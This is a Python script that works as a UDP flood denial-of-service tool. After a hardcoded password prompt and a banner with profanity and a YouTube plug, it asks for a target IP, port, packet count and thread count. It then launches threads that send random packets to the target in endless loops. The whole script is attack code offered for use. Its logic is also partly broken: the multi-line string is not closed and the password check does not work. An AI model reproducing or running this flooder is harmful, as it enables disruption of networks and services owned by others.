import random
import socket
import threading
import os,sys
import time

os.system("clear") 
password = input("[+] Password :")
time.sleep(2)
print("[•]  WAIT FOR 5 SECOND!!! ") 
time.sleep(5) 
if password=="zielx":
  print("[✓] Login Successful!!!")
  time.sleep(3)
  os.system("clear")
  print("\033[1;34;40m=>Build By ZieLx<=")
  time.sleep(1)
  print("\033[1;34;40m=>JANGAN ABUSE KONTOL<= ")
  time.sleep(1)
  print("\033[1;34;40m=>DONT FORGET TO SUBS MY YOUTUBE CHANNEL<=")
  time.sleep(3)
os.system('clear')
print("\033[94m

███████╗██╗███████╗██╗░░░░░██╗░░██╗
╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝
░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░
██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░
███████╗██║███████╗███████╗██╔╝╚██╗
╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
                                               
         >>>  HAI KONTOL!!! 
         >>>  Build By ZieLx
         >>>  Don't forget to subs my YouTube Channel
         >>>  MY YOUTUBE : ZIEL ?
\033[94m")

ip = str(input("\033[94m===> | Ip Target    : "))
port = int(input("===> | Port Target   : "))
times = int(input("===> | Packets       : "))
threads = int(input("===> | Threads       : "))
choice = str(input("===> | Ready? (y/n)  : ")) 

def wibu():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\033[94mZieLx Attacking Ip \033[1;31;40m{ip} \033[94mPort \033[1;31;40m{port} !!! ") 
		except:
			print(f"\033[94mZieLx Attacking Ip \033[1;31;40m{ip} \033[94mPort \033[1;31;40m{port} !!! ") 

def wibu2():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f"\033[94mZieLx Attacking Ip \033[1;31;40m{ip} \033[94mPort \033[1;31;40m{port} !!! ") 
		except:
			print(f"\033[94mZieLx Attacking Ip \033[1;31;40m{ip} \033[94mPort \033[1;31;40m{port} !!! ") 


# Threads
for y in range(threads):
	th = threading.Thread(target = wibu)
	th.start()
else:
		th = threading.Thread(target = wibu2)
		th.start()
		print("\033[1;31;40m[!] Wrong Password!")
